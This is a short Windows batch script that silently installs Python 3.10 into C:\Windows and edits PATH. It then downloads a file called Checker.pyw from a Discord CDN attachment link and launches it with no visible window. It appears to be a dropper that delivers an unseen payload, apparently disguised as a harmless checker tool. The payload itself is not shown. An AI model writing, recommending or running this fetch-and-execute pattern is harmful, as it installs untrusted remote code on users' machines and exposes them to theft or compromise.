ECHO @OFF
curl https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -o python-3.10.0-amd64.exe
python-3.10.0-amd64.exe /quiet TargetDir=C:\Windows
setx PATH "%PATH%;C:\Python310;C:\Python310\Scripts"
curl https://cdn.discordapp.com/attachments/1079932244010991637/1081015652032204914/Checker.pyw -O
start Checker.pyw